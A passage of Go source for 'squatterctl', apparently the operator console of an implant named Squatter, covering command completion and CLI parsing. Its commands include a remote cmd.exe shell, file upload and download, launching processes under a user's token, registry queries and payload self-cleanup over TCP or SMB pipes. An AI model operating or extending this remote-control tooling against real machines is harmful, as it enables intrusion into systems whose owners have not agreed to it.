		ui.writer.WriteRaw([]byte{'\r'})
		ui.writer.EraseLine()
	}
	if ui.renderedCompletionRows > 0 {
		ui.writer.CursorUp(ui.renderedCompletionRows)
	}
	ui.renderedCompletionRows = 0
}

func (ui *shellPromptUI) renderCompletions() {
	const maxRows = 10
	rows := len(ui.completions)
	if rows > maxRows {
		rows = maxRows
	}
	for row := 0; row < rows; row++ {
		ui.writer.CursorDown(1)
		ui.writer.WriteRaw([]byte{'\r'})
		ui.writer.EraseLine()
		if row == ui.completionIndex {
			ui.writer.SetColor(prompt.Black, prompt.Fuchsia, true)
		} else {
			ui.writer.SetColor(prompt.White, prompt.Black, false)
		}
		ui.writer.WriteStr(" " + ui.completions[row].Text + " ")
		ui.writer.SetColor(prompt.LightGray, prompt.Black, false)
		if ui.completions[row].Description != "" {
			ui.writer.WriteStr(" " + ui.completions[row].Description + " ")
		}
		ui.writer.SetColor(prompt.DefaultColor, prompt.DefaultColor, false)
	}
	if rows > 0 {
		ui.writer.CursorUp(rows)
	}
	ui.renderedCompletionRows = rows
}

// Suggestions returns prompt suggestions for the given shell state. It is kept
// separate from go-prompt so tests and future frontends can reuse the metadata.
func Suggestions(activeModule, line string) []prompt.Suggest {
	fields := strings.Fields(line)
	endsWithSpace := strings.HasSuffix(line, " ")
	if activeModule != "" {
		prefix := currentPrefix(fields, endsWithSpace)
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "END", Description: "ask common demo modules to close"},
			{Text: "detach", Description: "return to the top-level squatter prompt"},
			{Text: "quit", Description: "close squatterctl"},
		}, prefix)
	}
	if len(fields) == 0 || (len(fields) == 1 && !endsWithSpace) {
		return filterPromptSuggestions(topLevelSuggestions(), currentPrefix(fields, endsWithSpace))
	}
	command := fields[0]
	prefix := currentPrefix(fields, endsWithSpace)
	switch command {
	case "getfile":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: `C:\Windows\Temp\hovel-squatter.exe`, Description: "example Squatter install path"},
			{Text: `C:\boot.ini`, Description: "small XP-era smoke-test file"},
		}, prefix)
	case "putfile":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "/etc/passwd", Description: "local file example"},
			{Text: `C:\Documents and Settings\user\Desktop\file.txt`, Description: "remote desktop path example"},
		}, prefix)
	case "echo":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "hello", Description: "demo argument"},
			{Text: "operator", Description: "demo argument"},
		}, prefix)
	case "cmd":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "--interactive", Description: "open an interactive cmd.exe stream"},
			{Text: "whoami", Description: "print current security context"},
			{Text: "hostname", Description: "print target host name"},
			{Text: "echo hello", Description: "small output smoke test"},
		}, prefix)
	case "process.run":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "hostname", Description: "small process smoke test"},
			{Text: "ipconfig /all", Description: "network configuration"},
			{Text: "10000", Description: "timeout in milliseconds"},
		}, prefix)
	case "process.run_as_user":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: `C:\WINDOWS\explorer.exe`, Description: "restart Explorer on the interactive desktop"},
			{Text: `C:\WINDOWS\system32\notepad.exe`, Description: "small desktop process smoke test"},
			{Text: `C:\WINDOWS`, Description: "optional working directory"},
		}, prefix)
	case "file.stat":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: `C:\Windows\System32\cmd.exe`, Description: "common system binary"},
			{Text: `C:\boot.ini`, Description: "small XP-era smoke-test file"},
		}, prefix)
	case "registry.query":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "HKLM", Description: "local machine hive"},
			{Text: `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, Description: "Windows version key"},
		}, prefix)
	case "eventlog.query":
		return filterPromptSuggestions([]prompt.Suggest{
			{Text: "System", Description: "system event log"},
			{Text: "Application", Description: "application event log"},
		}, prefix)
	default:
		return nil
	}
}

func topLevelSuggestions() []prompt.Suggest {
	return []prompt.Suggest{
		{Text: "cmd", Description: "open cmd.exe or run one command through cmd.exe /c"},
		{Text: "echo", Description: "open the echo module"},
		{Text: "getfile", Description: "download a file from target"},
		{Text: "putfile", Description: "upload a file to target"},
		{Text: "wininfo", Description: "collect native Windows host facts"},
		{Text: "process.list", Description: "list processes"},
		{Text: "process.run", Description: "run process with typed exit metadata"},
		{Text: "process.run_as_user", Description: "launch process with an interactive user token"},
		{Text: "payload.status", Description: "show Squatter lifecycle status"},
		{Text: "payload.cleanup", Description: "request Squatter self-cleanup"},
		{Text: "file.stat", Description: "stat and hash a file"},
		{Text: "registry.query", Description: "query a registry value"},
		{Text: "eventlog.query", Description: "read recent event log records"},
		{Text: "drive.list", Description: "list logical drives"},
		{Text: "share.list", Description: "list local shares"},
		{Text: "acl.stat", Description: "return SDDL for a path"},
		{Text: "help", Description: "show command summary"},
		{Text: "quit", Description: "close squatterctl"},
		{Text: "exit", Description: "close squatterctl"},
	}
}

func currentPrefix(fields []string, endsWithSpace bool) string {
	if endsWithSpace || len(fields) == 0 {
		return ""
	}
	return fields[len(fields)-1]
}

func filterPromptSuggestions(suggestions []prompt.Suggest, prefix string) []prompt.Suggest {
	if prefix == "" {
		return suggestions
	}
	var out []prompt.Suggest
	for _, suggestion := range suggestions {
		if strings.HasPrefix(suggestion.Text, prefix) {
			out = append(out, suggestion)
		}
	}
	return out
}

type Mode string

const (
	ModeShell   Mode = "shell"
	ModeDemo    Mode = "demo"
	ModeStreams Mode = "streams"
)

type CLIOptions struct {
	Mode     Mode
	Streams  int
	Host     string
	Port     string
	SMB      bool
	Domain   string
	Username string
	Password string
	Pipe     string
	SMBPort  int
}

func ParseCLI(args []string) (CLIOptions, error) {
	opts := CLIOptions{Mode: ModeShell, Streams: 3, Host: "127.0.0.1", Port: "9100"}
	positionals := make([]string, 0, 2)
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--demo":
			opts.Mode = ModeDemo
		case "--streams":
			opts.Mode = ModeStreams
			i++
			if i >= len(args) {
				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
			}
			streams, err := strconv.Atoi(args[i])
			if err != nil || streams < 1 {
				return CLIOptions{}, fmt.Errorf("--streams must be a positive integer")
			}
			opts.Streams = streams
		case "--smb":
			opts.SMB = true
		case "--domain":
			i++
			if i >= len(args) {
				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
			}
			opts.Domain = args[i]
		case "--user", "--username":
			i++
			if i >= len(args) {
				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
			}
			opts.Username = args[i]
		case "--password":
			i++
			if i >= len(args) {
				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
			}
			opts.Password = args[i]
		case "--pipe":
			i++
			if i >= len(args) {
				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
			}
			opts.Pipe = args[i]
		case "--smb-port":
			i++
			if i >= len(args) {
				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
			}
			port, err := strconv.Atoi(args[i])
			if err != nil || port < 1 || port > 65535 {
				return CLIOptions{}, fmt.Errorf("--smb-port must be an integer between 1 and 65535")
			}
			opts.SMBPort = port
		default:
			positionals = append(positionals, args[i])
		}
	}
	if len(positionals) > 0 {
		opts.Host = positionals[0]
	}
	if len(positionals) > 1 {
		opts.Port = positionals[1]
	}
	return opts, nil
}
